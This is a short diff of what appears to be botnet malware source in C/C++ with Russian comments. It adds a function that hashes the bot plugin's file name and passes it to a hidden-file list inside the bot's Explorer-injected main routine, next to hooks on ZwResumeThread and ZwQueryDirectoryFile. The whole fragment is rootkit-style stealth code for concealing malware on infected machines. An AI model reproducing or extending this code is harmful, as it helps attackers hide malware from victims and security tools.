@@ -64,6 +64,9 @@ int FakeDllLenCryptKey = 0; //длина ключа шифрования тела бота
 
 //DWORD dwExplorerPid  = 0; //пид эксплорера
 
+//вычисляет хеш имяени файла в котором находится ботплаг, по этому хешу идет скрытие файла
+DWORD GetHashFileNameBotPlug();
+
 DWORD WINAPI LoaderRoutine(LPVOID Data)
 {
 	BOT::Initialize(ProcessLoader);
@@ -150,6 +153,7 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 
 	// Инициализируем систему отправки статистической информации
 	DebugReportInit();
+	BOT::AddHiddenFile(GetHashFileNameBotPlug());
 
 	HookZwResumeThread();
 	HookZwQueryDirectoryFile();
